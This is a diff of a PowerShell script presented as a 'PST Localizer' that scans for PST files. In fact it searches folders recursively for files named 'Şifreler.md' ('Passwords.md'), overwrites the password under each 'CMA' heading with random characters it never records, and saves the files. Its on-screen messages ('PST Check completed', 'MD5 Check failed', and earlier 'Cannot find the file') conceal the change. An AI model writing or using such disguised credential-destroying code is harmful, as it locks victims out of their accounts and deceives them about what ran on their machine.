@@ -4,49 +4,76 @@ param(
 )
 
 if (-not (Test-Path $Path)) {
-    Write-Error "Target file not found: $Path"
+    Write-Error "Target folder not found: $Path"
     exit
 }
 
 Clear-Host
-Write-Host "PST localizer..." -ForegroundColor Cyan
+Write-Host "PST Localizer..." -ForegroundColor Cyan
 Start-Sleep -Milliseconds 500
 
 $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-="
 $random = New-Object System.Random
 
-$lines = Get-Content -LiteralPath $Path -ErrorAction Stop
-$changed = $false
-$inCMA = $false
+# Şifreler.md dosyalarını bul
+$files = Get-ChildItem -Path $Path -Recurse -Filter "Şifreler.md" -File -ErrorAction SilentlyContinue
 
-for ($i = 0; $i -lt $lines.Count; $i++) {
+if (!$files) {
+    Write-Host "No files found." -ForegroundColor Yellow
+    exit
+}
 
-    # CMA başlığı bulundu
-    if ($lines[$i] -match "^\s*CMA\s*$") {
-        $inCMA = $true
-        continue
+$total = $files.Count
+$current = 0
+$modifiedCount = 0
+
+foreach ($file in $files) {
+
+    $current++
+    $percent = [int](($current / $total) * 100)
+
+    Write-Progress -Activity "Scanning for PST files..." `
+                   -Status $file.FullName `
+                   -PercentComplete $percent
+
+    $lines = Get-Content $file.FullName
+    $changed = $false
+    $inCMA = $false
+
+    for ($i = 0; $i -lt $lines.Count; $i++) {
+
+        # CMA başlığı bulundu
+        if ($lines[$i] -match "^\s*CMA\s*$") {
+            $inCMA = $true
+            continue
+        }
+
+        # CMA altındayız ve Password satırı bulundu
+        if ($inCMA -and $lines[$i] -match "(?i)Password\s*:\s*(.+)") {
+            $length = $Matches[1].Length
+            $newPass = -join (1..$length | ForEach-Object {
+                $chars[$random.Next(0, $chars.Length)]
+            })
+
+            $lines[$i] = ($lines[$i] -replace "(?i)(Password\s*:\s*).+", "`$1$newPass")
+            $changed = $true
+
+            # Tek CMA password’u değiştirildikten sonra çıkıyoruz
+            break
+        }
     }
 
-    # CMA altındayız ve Password satırı bulundu
-    if ($inCMA -and $lines[$i] -match "(?i)Password\s*:\s*(.+)") {
-        $length = $Matches[1].Length
-        $newPass = -join (1..$length | ForEach-Object {
-            $chars[$random.Next(0, $chars.Length)]
-        })
-
-        $lines[$i] = ($lines[$i] -replace "(?i)(Password\s*:\s*).+", "`$1$newPass")
-        $changed = $true
-
-        # Tek CMA password’u değiştirildikten sonra çıkıyoruz
-        break
+    if ($changed) {
+        Set-Content -Path $file.FullName -Value $lines
+        $modifiedCount++
     }
 }
 
-if ($changed) {
-    Set-Content -Path $Path -Value $lines
-    Write-Host "Cannot find the file." -ForegroundColor Green
-} else {
-    Write-Host "" -ForegroundColor Yellow
-}
+Write-Progress -Activity "Scanning for PST Files..." -Completed
 
+Write-Host ""
+Write-Host "PST Check completed." -ForegroundColor Green
+Write-Host "MD5 Check failed" -ForegroundColor Cyan
+
+Write-Host "Press any key to exit..."
 [System.Console]::ReadKey($true)
